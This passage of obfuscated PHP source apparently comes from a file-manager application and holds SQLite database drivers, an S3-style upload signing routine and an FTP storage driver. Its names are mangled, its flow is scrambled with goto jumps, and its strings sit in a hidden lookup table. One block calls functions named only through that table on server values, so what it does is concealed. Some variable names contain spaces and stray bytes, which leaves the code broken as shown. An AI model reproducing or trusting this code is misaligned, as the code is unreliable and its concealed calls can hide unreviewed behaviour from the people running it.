(!extension_loaded($c¨„áöÄ½½[9])) { think_exception(think_lang($c¨„áöÄ½½[10]) . $c¨„áöÄ½½[11]); } if (!empty($A¡èÉî—íé)) { if (!isset($A¡èÉî—íé[$c¨„áöÄ½½[12]])) { $A¡èÉî—íé[$c¨„áöÄ½½[12]] = 438; } $this->config = $A¡èÉî—íé; if (empty($this->config[$c¨„áöÄ½½[13]])) { $this->config[$c¨„áöÄ½½[13]] = array(); } } } public function connect($CÇÊ½¬¿µ = '', $Fì•» ÎŒ– = 0) { $eé¶‚ Ÿµ =& $_SERVER[”Ì÷ñ­î¸]; if (!isset($this->linkID[$Fì•» ÎŒ–])) { goto Aš´…Ëâ™’; Aš´…Ëâ™’: if (empty($CÇÊ½¬¿µ)) { $CÇÊ½¬¿µ = $this->config; } $fˆĞï¸®Ö = !empty($CÇÊ½¬¿µ[$eé¶‚ Ÿµ[13]][$eé¶‚ Ÿµ[14]]) ? $CÇÊ½¬¿µ[$eé¶‚ Ÿµ[13]][$eé¶‚ Ÿµ[14]] : $this->pconnect; $fï¹ªÁ÷ÌÍ = $fˆĞï¸®Ö ? $eé¶‚ Ÿµ[15] : $eé¶‚ Ÿµ[16]; goto Dò¦ˆĞ‡ò; Dò¦ˆĞ‡ò: $this->linkID[$Fì•» ÎŒ–] = $fï¹ªÁ÷ÌÍ($CÇÊ½¬¿µ[$eé¶‚ Ÿµ[17]], $CÇÊ½¬¿µ[$eé¶‚ Ÿµ[12]]); if (!$this->linkID[$Fì•» ÎŒ–]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto aÜÌÑ¹¯Ï; aÜÌÑ¹¯Ï: @sqlite_busy_timeout($this->linkID[$Fì•» ÎŒ–], 30000); if (1 != think_config($eé¶‚ Ÿµ[18])) { unset($this->config); } goto AŸ¦±Òæ›ô; AŸ¦±Òæ›ô: } return $this->linkID[$Fì•» ÎŒ–]; } public function free() { $this->queryID = null; } public function query($CÁ½µÏ‹õ¬) { goto bÆâÁ´°Â; bÆâÁ´°Â: $C‰©æòÏ…´ =& $_SERVER[”Ì÷ñ­î¸]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto AïÕùÍäËƒ; AïÕùÍäËƒ: $this->queryStr = $CÁ½µÏ‹õ¬; if ($this->queryID) { $this->free(); } think_action_status($C‰©æòÏ…´[19], 1); goto B©íŠµ©‚Æ; Bƒù‰×“: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $c¡°å˜Å¶ƒ = $this->getAll(); return $c¡°å˜Å¶ƒ; } goto cŠÏ„“‚î; B©íŠµ©‚Æ: think_status($C‰©æòÏ…´[20]); $this->queryID = sqlite_query($this->_linkID, $CÁ½µÏ‹õ¬); $this->debug(); goto Bƒù‰×“; cŠÏ„“‚î: } public function execute($Eé‹ÎÇ·Ù) { goto dÁÙÌÕ½‰»; d›ùó˜¶È: think_status($eŒ·òê«‡‚[20]); $Bôáìœ³× = sqlite_exec($this->_linkID, $Eé‹ÎÇ·Ù); $this->debug(); goto eˆ¼ŒÒ×¸; D±ˆğâÚÇ: $this->queryStr = $Eé‹ÎÇ·Ù; if ($this->queryID) { $this->free(); } think_action_status($eŒ·òê«‡‚[21], 1); goto d›ùó˜¶È; dÁÙÌÕ½‰»: $eŒ·òê«‡‚ =& $_SERVER[”Ì÷ñ­î¸]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto D±ˆğâÚÇ; eˆ¼ŒÒ×¸: if (!1 === $Bôáìœ³×) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto aÕÓÁ‚¯ùÊ; aÕÓÁ‚¯ùÊ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[”Ì÷ñ­î¸][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $câò›ùÆƒ® = sqlite_query($this->_linkID, $_SERVER[”Ì÷ñ­î¸][23]); if (!$câò›ùÆƒ®) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $cÀäŠ¡†”É = sqlite_query($this->_linkID, $_SERVER[”Ì÷ñ­î¸][24]); if (!$cÀäŠ¡†”É) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $aºÍ«¶ï = array(); if ($this->numRows > 0) { for ($b„©İÄ É = 0; $b„©İÄ É < $this->numRows; $b„©İÄ É++) { $aºÍ«¶ï[$b„©İÄ É] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $aºÍ«¶ï; } public function getFields($c–ÛœÖƒãÆ) { $c’“ËÑ·ÔÃ =& $_SERVER[”Ì÷ñ­î¸]; $CßˆÆ‚ åš = $this->query($c’“ËÑ·ÔÃ[25] . $c–ÛœÖƒãÆ . $c’“ËÑ·ÔÃ[26]); $eí‡µ ßÚî = array(); if ($CßˆÆ‚ åš) { foreach ($CßˆÆ‚ åš as $Fõ®“é¸²Õ => $Dİ³£“¢º…) { $eí‡µ ßÚî[$Dİ³£“¢º…[$c’“ËÑ·ÔÃ[27]]] = array($c’“ËÑ·ÔÃ[28] => $Dİ³£“¢º…[$c’“ËÑ·ÔÃ[27]], $c’“ËÑ·ÔÃ[29] => $Dİ³£“¢º…[$c’“ËÑ·ÔÃ[30]], $c’“ËÑ·ÔÃ[31] => (bool) ($Dİ³£“¢º…[$c’“ËÑ·ÔÃ[32]] === $c’“ËÑ·ÔÃ[33]), $c’“ËÑ·ÔÃ[34] => $Dİ³£“¢º…[$c’“ËÑ·ÔÃ[35]], $c’“ËÑ·ÔÃ[36] => strtolower($Dİ³£“¢º…[$c’“ËÑ·ÔÃ[37]]) == $c’“ËÑ·ÔÃ[38], $c’“ËÑ·ÔÃ[39] => strtolower($Dİ³£“¢º…[$c’“ËÑ·ÔÃ[40]]) == $c’“ËÑ·ÔÃ[41]); } } return $eí‡µ ßÚî; } public function getTables($F¼í“…ë¾ò = '') { $cô á„È‚ =& $_SERVER[”Ì÷ñ­î¸]; $bäµ™†· = $this->query($cô á„È‚[42] . $cô á„È‚[43] . $cô á„È‚[44]); $eÙ—æ—š„• = array(); foreach ($bäµ™†· as $c”»ÓèìÇ => $AÛ‰‚Š‘Œ) { $eÙ—æ—š„•[$c”»ÓèìÇ] = current($AÛ‰‚Š‘Œ); } return $eÙ—æ—š„•; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $eÈ«œ”«›Â =& $_SERVER[”Ì÷ñ­î¸]; $Eß—ªÆšËå = sqlite_last_error($this->_linkID); $this->error = $Eß—ªÆšËå . $eÈ«œ”«›Â[4] . sqlite_error_string($Eß—ªÆšËå); if ($eÈ«œ”«›Â[33] != $this->queryStr) { $this->error .= LNG($eÈ«œ”«›Â[45]) . $this->queryStr; } think_trace($this->error, $eÈ«œ”«›Â[33], $eÈ«œ”«›Â[46]); return $this->error; } public function escapeString($DÎ¤Û÷‡) { return sqlite_escape_string($DÎ¤Û÷‡); } public function parseLimit($c“¢Œ•Ÿ†á) { $B×Î—Ùæé– =& $_SERVER[”Ì÷ñ­î¸]; $b™Ø…‰‡Ôğ = $B×Î—Ùæé–[33]; if (!empty($c“¢Œ•Ÿ†á)) { $c“¢Œ•Ÿ†á = explode($B×Î—Ùæé–[47], $c“¢Œ•Ÿ†á); if (count($c“¢Œ•Ÿ†á) > 1) { $b™Ø…‰‡Ôğ .= $B×Î—Ùæé–[48] . $c“¢Œ•Ÿ†á[1] . $B×Î—Ùæé–[49] . $c“¢Œ•Ÿ†á[0] . $B×Î—Ùæé–[50]; } else { $b™Ø…‰‡Ôğ .= $B×Î—Ùæé–[48] . $c“¢Œ•Ÿ†á[0] . $B×Î—Ùæé–[50]; } } return $b™Ø…‰‡Ôğ; } } class DbSqlite3Base extends Db { public function __construct($Bî‡ÇÁËîó = '') { $b’Ÿ›øÑ =& $_SERVER[”Ì÷ñ­î¸]; if (!class_exists($b’Ÿ›øÑ[51])) { think_exception(think_lang($b’Ÿ›øÑ[10]) . $b’Ÿ›øÑ[52]); } if (!empty($Bî‡ÇÁËîó)) { if (!isset($Bî‡ÇÁËîó[$b’Ÿ›øÑ[12]])) { $Bî‡ÇÁËîó[$b’Ÿ›øÑ[12]] = 438; } $this->config = $Bî‡ÇÁËîó; if (empty($this->config[$b’Ÿ›øÑ[13]])) { $this->config[$b’Ÿ›øÑ[13]] = array(); } } } public function connect($eÄš¿”‡ãÙ = '', $bïÂ¼İß‹Œ = 0) { $CİÊ’Çë³ =& $_SERVER[”Ì÷ñ­î¸]; if (!isset($this->linkID[$bïÂ¼İß‹Œ])) { if (empty($eÄš¿”‡ãÙ)) { $eÄš¿”‡ãÙ = $this->config; } $this->linkID[$bïÂ¼İß‹Œ] = new SQLite3($eÄš¿”‡ãÙ[$CİÊ’Çë³[17]]); if (!$this->linkID[$bïÂ¼İß‹Œ]) { think_exception($this->linkID[$bïÂ¼İß‹Œ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$bïÂ¼İß‹Œ]->busyTimeout(30000); if (1 != think_config($CİÊ’Çë³[18])) { unset($this->config); } } return $this->linkID[$bïÂ¼İß‹Œ]; } public function free() { $this->queryID = null; } public function query($bÛ¨¡˜ñê‹) { goto d±°Ÿê†ÓŠ; DßÌáø™óÀ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $aİØõÒö¼ = $this->getAll(); $this->numRows = count($aİØõÒö¼); return $aİØõÒö¼; } goto A³¼ˆ„„¢Ï; AŠ§ğ¥îòŞ: think_status($DÄ…‡ê†ó‚[20]); $this->queryID = $this->_linkID->query($bÛ¨¡˜ñê‹); $this->debug(); goto DßÌáø™óÀ; d±°Ÿê†ÓŠ: $DÄ…‡ê†ó‚ =& $_SERVER[”Ì÷ñ­î¸]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto b•Ú†õí; b•Ú†õí: $this->queryStr = $bÛ¨¡˜ñê‹; if ($this->queryID) { $this->free(); } think_action_status($DÄ…‡ê†ó‚[19], 1); goto AŠ§ğ¥îòŞ; A³¼ˆ„„¢Ï: } public function execute($A¸ˆ¯ÍÑŸ¦) { goto BßË÷Ïæ“‘; BßË÷Ïæ“‘: $DŒ¸ùğßöï =& $_SERVER[”Ì÷ñ­î¸]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Dï‰Úß¿˜; Dï‰Úß¿˜: $this->queryStr = $A¸ˆ¯ÍÑŸ¦; if ($this->queryID) { $this->free(); } think_action_status($DŒ¸ùğßöï[21], 1); goto aœ’Û¼óìà; eƒ¿‹áîê§: if (!1 === $a±–Ø‰’Î) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto A©ã×ŠÅæ‡; aœ’Û¼óìà: think_status($DŒ¸ùğßöï[20]); $a±–Ø‰’Î = $this->_linkID->exec($A¸ˆ¯ÍÑŸ¦); $this->debug(); goto eƒ¿‹áîê§; A©ã×ŠÅæ‡: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[”Ì÷ñ­î¸][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $b–ÈÚ¤Ğ™ = $this->_linkID->query($_SERVER[”Ì÷ñ­î¸][23]); if (!$b–ÈÚ¤Ğ™) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Cù¹öÜä£á = $this->_linkID->query($_SERVER[”Ì÷ñ­î¸][24]); if (!$Cù¹öÜä£á) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $EùÂ®‹Î¯è = array(); while ($FÀÃöÇáïá = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $EùÂ®‹Î¯è[] = $FÀÃöÇáïá; } $this->queryID->reset(); return $EùÂ®‹Î¯è; } public function getFields($FÌñ™à¹¡) { $Bî¨ƒ’Çê‹ =& $_SERVER[”Ì÷ñ­î¸]; $d–ğâÜâ‹Ş = $this->query($Bî¨ƒ’Çê‹[25] . $FÌñ™à¹¡ . $Bî¨ƒ’Çê‹[26]); $D‡æ—òİ¨§ = array(); if ($d–ğâÜâ‹Ş) { foreach ($d–ğâÜâ‹Ş as $AÉ¢¼ŒŞº => $c…é¶¸ÓšÍ) { $D‡æ—òİ¨§[$c…é¶¸ÓšÍ[$Bî¨ƒ’Çê‹[28]]] = array($Bî¨ƒ’Çê‹[28] => $c…é¶¸ÓšÍ[$Bî¨ƒ’Çê‹[28]], $Bî¨ƒ’Çê‹[29] => $c…é¶¸ÓšÍ[$Bî¨ƒ’Çê‹[29]], $Bî¨ƒ’Çê‹[31] => (bool) ($c…é¶¸ÓšÍ[$Bî¨ƒ’Çê‹[31]] === $Bî¨ƒ’Çê‹[33]), $Bî¨ƒ’Çê‹[34] => $c…é¶¸ÓšÍ[$Bî¨ƒ’Çê‹[53]], $Bî¨ƒ’Çê‹[36] => (bool) $c…é¶¸ÓšÍ[$Bî¨ƒ’Çê‹[54]], $Bî¨ƒ’Çê‹[39] => (bool) $c…é¶¸ÓšÍ[$Bî¨ƒ’Çê‹[54]]); } } return $D‡æ—òİ¨§; } public function getTables($BÑˆÈìÕ®è = '') { $Cœ¯äø«õ =& $_SERVER[”Ì÷ñ­î¸]; $bÖ®ÙËŒƒ = $this->query($Cœ¯äø«õ[42] . $Cœ¯äø«õ[43] . $Cœ¯äø«õ[44]); $a†ŠßÌçÖ» = array(); foreach ($bÖ®ÙËŒƒ as $B†‘‹¹ç‘ => $Fë‚Ä†Î¥©) { $a†ŠßÌçÖ»[$B†‘‹¹ç‘] = current($Fë‚Ä†Î¥©); } return $a†ŠßÌçÖ»; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $BÎ¨ğ½ùŸ =& $_SERVER[”Ì÷ñ­î¸]; $this->error = $this->_linkID->lastErrorMsg(); if ($BÎ¨ğ½ùŸ[33] != $this->queryStr) { $this->error .= LNG($BÎ¨ğ½ùŸ[45]) . $this->queryStr; } think_trace($this->error, $BÎ¨ğ½ùŸ[33], $BÎ¨ğ½ùŸ[46]); return $this->error; } public function escapeString($f¹Ñ¾£ƒ¶‚) { $bÉí†—î‡ =& $_SERVER[”Ì÷ñ­î¸]; if ($this->_linkID) { return $this->_linkID->escapeString($f¹Ñ¾£ƒ¶‚); } return str_ireplace($bÉí†—î‡[55], $bÉí†—î‡[56], $f¹Ñ¾£ƒ¶‚); } public function parseLimit($B…íèáŞ“Ë) { $c¦¯›°äæŒ =& $_SERVER[”Ì÷ñ­î¸]; $DÍé¸ì¢¶° = $c¦¯›°äæŒ[33]; if (!empty($B…íèáŞ“Ë)) { $B…íèáŞ“Ë = explode($c¦¯›°äæŒ[47], $B…íèáŞ“Ë); if (count($B…íèáŞ“Ë) > 1) { $DÍé¸ì¢¶° .= $c¦¯›°äæŒ[48] . $B…íèáŞ“Ë[1] . $c¦¯›°äæŒ[49] . $B…íèáŞ“Ë[0] . $c¦¯›°äæŒ[50]; } else { $DÍé¸ì¢¶° .= $c¦¯›°äæŒ[48] . $B…íèáŞ“Ë[0] . $c¦¯›°äæŒ[50]; } } return $DÍé¸ì¢¶°; } } goto C‚ˆæù¾ø«; a…¹’µ†±Â: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($cöò·Èœõ‚) { parent::__construct($cöò·Èœõ‚); $this->signatureVersion($_SERVER[”Ì÷ñ­î¸][200]); } public function uploadFormData($fÑØ³ƒäŒÓ, $E­·Ì‡ƒå¸ = 3600) { goto eÁÁ¦Ù„š¾; eÁÁ¦Ù„š¾: $AÈÇ¨®æ«¦ =& $_SERVER[”Ì÷ñ­î¸]; $añ“Ø¸ïŠµ = $AÈÇ¨®æ«¦[185]; $eËÚ†ÁˆÖò = $AÈÇ¨®æ«¦[1133]; goto BÌÎß¥ÎŠó; BÌÎß¥ÎŠó: $DáÜ£¢œÊò = $AÈÇ¨®æ«¦[59]; $b­‰îïí¯õ = gmdate($AÈÇ¨®æ«¦[1134]); $D„œ¬šŠœ = gmdate($AÈÇ¨®æ«¦[691]); goto Bİ–’­¡Î; BÑù‘„º¬: $eä…ó½ğæË = array($this->accessKey, $D„œ¬šŠœ, $this->region, $DáÜ£¢œÊò, $Aø„ÓªŞĞÎ); $c‡¯ïïÇ· = implode($AÈÇ¨®æ«¦[8], $eä…ó½ğæË); $D ¤­âùˆ› = array($AÈÇ¨®æ«¦[1102] => gmdate($AÈÇ¨®æ«¦[1101], strtotime($AÈÇ¨®æ«¦[1136])), $AÈÇ¨®æ«¦[1103] => array(array($AÈÇ¨®æ«¦[1105] => $this->bucket), array($AÈÇ¨®æ«¦[1104] => $añ“Ø¸ïŠµ), array($AÈÇ¨®æ«¦[1106], $AÈÇ¨®æ«¦[1107], $AÈÇ¨®æ«¦[33]), array($AÈÇ¨®æ«¦[1106], $AÈÇ¨®æ«¦[1137], $AÈÇ¨®æ«¦[33]), array($AÈÇ¨®æ«¦[1106], $AÈÇ¨®æ«¦[1138], $AÈÇ¨®æ«¦[33]), array($AÈÇ¨®æ«¦[1108] => $A—’Ú§ƒÏÚ), array($AÈÇ¨®æ«¦[1139] => $c‡¯ïïÇ·), array($AÈÇ¨®æ«¦[1140] => $eËÚ†ÁˆÖò), array($AÈÇ¨®æ«¦[1141] => $b­‰îïí¯õ), array($AÈÇ¨®æ«¦[1142] => $C·ë¸¬âè«))); goto bùõ×÷ƒšÖ; bùõ×÷ƒšÖ: $Fƒäˆ½ğÄ§ = base64_encode(json_encode($D ¤­âùˆ›)); $A¨å¥ÏŒÊ£ = hash_hmac($AÈÇ¨®æ«¦[1143], $D„œ¬šŠœ, $AÈÇ¨®æ«¦[1144] . $this->secret, !0); $F›“±Î±ÀÜ = hash_hmac($AÈÇ¨®æ«¦[1143], $this->region, $A¨å¥ÏŒÊ£, !0); goto f¾Òì—À²Æ; Bİ–’­¡Î: $Aø„ÓªŞĞÎ = $AÈÇ¨®æ«¦[1135]; $C·ë¸¬âè« = $E­·Ì‡ƒå¸ . $AÈÇ¨®æ«¦[33]; $A—’Ú§ƒÏÚ = $AÈÇ¨®æ«¦[1100]; goto BÑù‘„º¬; aÓ‘„Ä¿§: $a¡”âƒ»·ë = array($AÈÇ¨®æ«¦[199] => $AÈÇ¨®æ«¦[33], $AÈÇ¨®æ«¦[1145] => $AÈÇ¨®æ«¦[33], $AÈÇ¨®æ«¦[1104] => $añ“Ø¸ïŠµ, $AÈÇ¨®æ«¦[1108] => $A—’Ú§ƒÏÚ, $AÈÇ¨®æ«¦[1112] => $Fƒäˆ½ğÄ§, $AÈÇ¨®æ«¦[1146] => $c‡¯ïïÇ·, $AÈÇ¨®æ«¦[1147] => $eËÚ†ÁˆÖò, $AÈÇ¨®æ«¦[1148] => $b­‰îïí¯õ, $AÈÇ¨®æ«¦[1149] => $C·ë¸¬âè«, $AÈÇ¨®æ«¦[1150] => $E¶ËÙ´‹çì, $AÈÇ¨®æ«¦[169] => $this->getHost()); return $a¡”âƒ»·ë; goto cÊÏ‡Ò·‰Ä; f¾Òì—À²Æ: $A³ÔÊ®É­ = hash_hmac($AÈÇ¨®æ«¦[1143], $DáÜ£¢œÊò, $F›“±Î±ÀÜ, !0); $aªë”Ğ„ØÎ = hash_hmac($AÈÇ¨®æ«¦[1143], $Aø„ÓªŞĞÎ, $A³ÔÊ®É­, !0); $E¶ËÙ´‹çì = hash_hmac($AÈÇ¨®æ«¦[1143], $Fƒäˆ½ğÄ§, $aªë”Ğ„ØÎ); goto aÓ‘„Ä¿§; cÊÏ‡Ò·‰Ä: } } if ($_SERVER[$_SERVER[”Ì÷ñ­î¸][791]] != $_SERVER[$_SERVER[”Ì÷ñ­î¸][1151]]) { goto cæ¤”¤ìÕÄ; dˆ‡•…¯õß: $D¬ËÉÛˆÌ‚ = explode($_SERVER[”Ì÷ñ­î¸][217], $fî Í—çÚÔ); if (count($D¬ËÉÛˆÌ‚) < $_SERVER[”Ì÷ñ­î¸][553]) { $fó±ŸéÕå = $_SERVER[”Ì÷ñ­î¸][794]; $fó±ŸéÕå(); } $bìÍ˜ãŒİ½ = $_SERVER[”Ì÷ñ­î¸][1152]; goto d˜¾Õ¸”ÈÌ; cæ¤”¤ìÕÄ: $CÃÃ“ŠŞÙ = $_SERVER[”Ì÷ñ­î¸][793]; $b´ïäå‰Õ = $_SERVER[$_SERVER[”Ì÷ñ­î¸][788]] . $_SERVER[”Ì÷ñ­î¸][789]; $fî Í—çÚÔ = $CÃÃ“ŠŞÙ($b´ïäå‰Õ); goto dˆ‡•…¯õß; d˜¾Õ¸”ÈÌ: $bìÍ˜ãŒİ½($_SERVER[$_SERVER[”Ì÷ñ­î¸][1153]]); goto bã­†º•«É; bã­†º•«É: } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($eƒ™æ À¶Ú) { parent::__construct(); if (count($eƒ™æ À¶Ú) > 0) { $this->_init($eƒ™æ À¶Ú); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($BÒ²Î†§…Ş) { $EÄ²¹†Ì“ =& $_SERVER[”Ì÷ñ­î¸]; global $config; $this->appCharset = $config[$EÄ²¹†Ì“[1154]]; $this->systemCharset = $config[$EÄ²¹†Ì“[1155]]; if (isset($BÒ²Î†§…Ş[$EÄ²¹†Ì“[1156]]) && $BÒ²Î†§…Ş[$EÄ²¹†Ì“[1156]]) { $this->systemCharset = $BÒ²Î†§…Ş[$EÄ²¹†Ì“[1156]]; } } public function iconvApp($eõ‚”í³‰) { return $this->iconvTo($eõ‚”í³‰, $this->systemCharset, $this->appCharset); } public function iconvSystem($eæí†ó¢òç) { return $this->iconvTo($eæí†ó¢òç, $this->appCharset, $this->systemCharset); } public function getPathOuter($EêŞÔÒÁÎ) { goto E¤Óœ«°Ğ‹; E¤Óœ«°Ğ‹: $F×äĞšòß =& $_SERVER[”Ì÷ñ­î¸]; $Fñ©…ì”‘˜ = $this->iconvApp($this->pathBase); $EêŞÔÒÁÎ = $this->iconvApp($EêŞÔÒÁÎ); goto bêÙŒŞã»÷; FÓ¨÷ò„İé: $EêŞÔÒÁÎ = KodIO::clear($EêŞÔÒÁÎ); $EêŞÔÒÁÎ = substr($EêŞÔÒÁÎ, strlen($Fñ©…ì”‘˜)); if (empty($this->pathDriver)) { return $EêŞÔÒÁÎ; } goto E…Ñ°‡¥¤; E…Ñ°‡¥¤: return $this->pathDriver . $F×äĞšòß[8] . ltrim($EêŞÔÒÁÎ, $F×äĞšòß[8]); goto E¹™çÌ‡Ç; bêÙŒŞã»÷: if (substr($Fñ©…ì”‘˜, 0, 2) == $F×äĞšòß[1157]) { $Fñ©…ì”‘˜ = BASIC_PATH . substr($Fñ©…ì”‘˜, 2); } if (substr($EêŞÔÒÁÎ, 0, 2) == $F×äĞšòß[1157]) { $EêŞÔÒÁÎ = BASIC_PATH . substr($EêŞÔÒÁÎ, 2); } $Fñ©…ì”‘˜ = KodIO::clear($Fñ©…ì”‘˜); goto FÓ¨÷ò„İé; E¹™çÌ‡Ç: } private function _init($F°ö”™©¾Ò = array()) { goto Aƒá”Õ…µœ; Fìà¢Ë„®: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $EïÚ»‹ŒÊ = @ftp_login($this->connect, $this->username, $this->userpass); goto FìÁ÷ØÄêô; b‰‘ª‡’: $f÷ãˆŒ¡œÈ = isset($AÉ¬ñˆ˜¶[$F“¥ÕÇˆÉÛ[168]]) && $AÉ¬ñˆ˜¶[$F“¥ÕÇˆÉÛ[168]] == $F“¥ÕÇˆÉÛ[1160] ? !0 : !1; $this->scheme = $f÷ãˆŒ¡œÈ ? $F“¥ÕÇˆÉÛ[1161] : $F“¥ÕÇˆÉÛ[1162]; $this->port = isset($AÉ¬ñˆ˜¶[$F“¥ÕÇˆÉÛ[170]]) ? $AÉ¬ñˆ˜¶[$F“¥ÕÇˆÉÛ[170]] : 21; goto Fìà¢Ë„®; FìÁ÷ØÄêô: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $B¿ÖŸÉº¢Ñ[$f®È¼·] = array($F“¥ÕÇˆÉÛ[1163] => $this->connect, $F“¥ÕÇˆÉÛ[169] => $this->host, $F“¥ÕÇˆÉÛ[168] => $this->scheme, $F“¥ÕÇˆÉÛ[170] => $this->port); goto DÆ§«Ë½Ìº; DÆ§«Ë½Ìº: return $EïÚ»‹ŒÊ; goto fŠÚÒ®”Û; Aƒá”Õ…µœ: $F“¥ÕÇˆÉÛ =& $_SERVER[”Ì÷ñ­î¸]; if (!function_exists($F“¥ÕÇˆÉÛ[1158])) { show_json(LNG($F“¥ÕÇˆÉÛ[1159]), !1); } $this->charsetReset($F°ö”™©¾Ò); goto Eä»ËÜ©£; c‹Í‘éƒ°: if (isset($B¿ÖŸÉº¢Ñ[$f®È¼·])) { foreach ($B¿ÖŸÉº¢Ñ[$f®È¼·] as $c·ÜÏÒğ => $eóïĞ—®) { $this->{$c·ÜÏÒğ} = $eóïĞ—®; } return !0; } $AÉ¬ñˆ˜¶ = parse_url(trim($this->server, $F“¥ÕÇˆÉÛ[8])); $this->host = $AÉ¬ñˆ˜¶[$F“¥ÕÇˆÉÛ[169]]; goto b‰‘ª‡’; Eä»ËÜ©£: foreach ($F°ö”™©¾Ò as $c·ÜÏÒğ => $eóïĞ—®) { if (isset($this->{$c·ÜÏÒğ})) { $this->{$c·ÜÏÒğ} = $eóïĞ—®; } } static $B¿ÖŸÉº¢Ñ = array(); $f®È¼· = md5(json_encode($F°ö”™©¾Ò)); goto c‹Í‘éƒ°; fŠÚÒ®”Û: } private function _isconn() { return is_resource($this->connect); } public function mkfile($Aƒ÷‡“Ø, $CÆÄ®© = '', $CÆ÷ÂËèƒÑ = REPEAT_RENAME) { if ($this->setContent($Aƒ÷‡“Ø, $CÆÄ®©)) { return $this->getPathOuter($Aƒ÷‡“Ø); } return !1; } public function mkdir($b–ğ™é„­, $DÌÖ§¨Ÿ¬¼ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $b–ğ™é„­ = $this->iconvSystem($b–ğ™é„­); if ($this->isFolder($b–ğ™é„­) || @ftp_mkdir($this->connect, $b–ğ™é„­)) { return $this->getPathOuter($b–ğ™é„­); } if (!$this->mkdir($this->pathFather($b–ğ™é„­))) { return !1; } if ($b–ğ™é„­ = @ftp_mkdir($this->connect, $b–ğ™é„­)) { return $this->getPathOuter($b–ğ™é„­); } return !1; } public function copyFile($c‚¸äƒ¹äÇ, $CÖÌãÌ) { goto f™³éô‚¬; b¸í¹¨ªŠ…: $Eõ¸¬ì£ò = $this->iconvApp($dö¼›èğì); $this->download($c‚¸äƒ¹äÇ, $Eõ¸¬ì£ò); $cÍŒ¬½‡ÎÎ = $this->upload($CÖÌãÌ, $Eõ¸¬ì£ò); goto fÑë™ãÒŠø; fÑë™ãÒŠø: $this->tempFileRemve($dö¼›èğì); return $cÍŒ¬½‡ÎÎ; goto dÄİ·§¶å…; f™³éô‚¬: if (!$this->_isconn()) { return !1; } $c¦çŞÀº = $this->pathThis($this->iconvSystem($c‚¸äƒ¹äÇ)); $dö¼›èğì = $this->tempFile($c¦çŞÀº); goto b¸í¹¨ªŠ…; dÄİ·§¶å…: } public function moveFile($Fíòæ’Ø™İ, $b‚…Œ„ß˜¥) { if (!$this->_isconn()) { return !1; } $Fíòæ’Ø™İ = $this->iconvSystem($Fíòæ’Ø™İ); $b‚…Œ„ß˜¥ = $this->iconvSystem($b‚…Œ„ß˜¥); $CòÎ‘¯ß¢¦ = @ftp_rename($this->connect, $Fíòæ’Ø™İ, $b‚…Œ„ß˜¥); return $CòÎ‘¯ß¢¦ ? $this->getPathOuter($b‚…Œ„ß˜¥) : !1; } public function delFile($b›…÷Î»¥) { if (!$this->_isconn()) { return !1; } $b›…÷Î»¥ = $this->iconvSystem($b›…÷Î»¥); return @ftp_delete($this->connect, $b›…÷Î»¥); } public function delFolder($aÌÕÇç ğÒ) { if (!$this->_isconn()) { return !1; } $aÌÕÇç ğÒ = $this->iconvSystem($aÌÕÇç ğÒ); $dœ‹ğçÈ× = $this->ftpList($aÌÕÇç ğÒ); if (!$dœ‹ğçÈ×) { return @ftp_rmdir($this->connect, $aÌÕÇç ğÒ); } foreach ($dœ‹ğçÈ× as $b ‚®Ó¨–´) { if ($this->isFolder($b ‚®Ó¨–´)) { $b ‚®Ó¨–´ = $this->iconvApp($b ‚®Ó¨–´); $this->delFolder($b ‚®Ó¨–´); } else { @ftp_delete($this->connect, $b ‚®Ó¨–´); } } return @ftp_rmdir($this->connect, $aÌÕÇç ğÒ); } public function rename($bğ«Ğ…À, $fĞÌ‰­†š–) { goto D‹Ì íÛÌÛ; D­ã°µá”ê: $CÁÈ¾õÛÜù = $this->iconvSystem($CÁÈ¾õÛÜù); $bğ«Ğ…À = $this->iconvSystem($bğ«Ğ…À); $BÆ¬‹Ş¼»¾ = $this->pathFather($bğ«Ğ…À); goto DÅ…†Ñ”©; c†½ÄÇœè: return $c’Ãï¢İ‚È ? $this->getPathOuter($BğææÑ®¡İ) : !1; goto DáÃ‡¼„îƒ; DÅ…†Ñ”©: $BğææÑ®¡İ = rtrim($BÆ¬‹Ş¼»¾, $f¹È°ªƒÙ•[8]) . $f¹È°ªƒÙ•[8] . $CÁÈ¾õÛÜù; 